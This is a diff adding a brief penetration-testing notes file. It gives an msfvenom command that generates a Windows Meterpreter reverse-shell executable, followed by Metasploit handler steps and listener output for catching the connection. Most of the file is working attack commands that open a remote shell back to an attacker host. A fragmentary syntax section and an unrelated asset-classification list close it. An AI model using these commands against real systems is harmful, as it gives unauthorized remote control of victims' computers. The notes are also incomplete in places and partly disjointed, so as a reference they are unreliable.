@@ -1,0 +1,34 @@
+[Creating a Payload]
+
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> PORT=4444 -f exe > shell.exe
+
+:: Sintax :: 
+
+-p (PAYLOAD)
+-f 
+[Establishing a Listener]
+
+- MSFCONSOLE
+    - use /exploit/multi/handler
+	- set payload windows/meterpreter/reverse_tcp
+	- set LHOST X.X.X.179
+	- set LPORT 4444
+	- set ExitOnSession false
+	- exploit -j -z
+	- sessions -l
+	- sessions -i 2
+
+[OUTPUT]
+
+[*] Exploit running as background job.
+
+[*] Started reverse TCP handler on X.X.X.179:4444 
+[*] Starting the payload handler...
+
+
+
+
+Active assets	
+	- Identified 
+	- Classified
+	- Determine the objectives and priorities
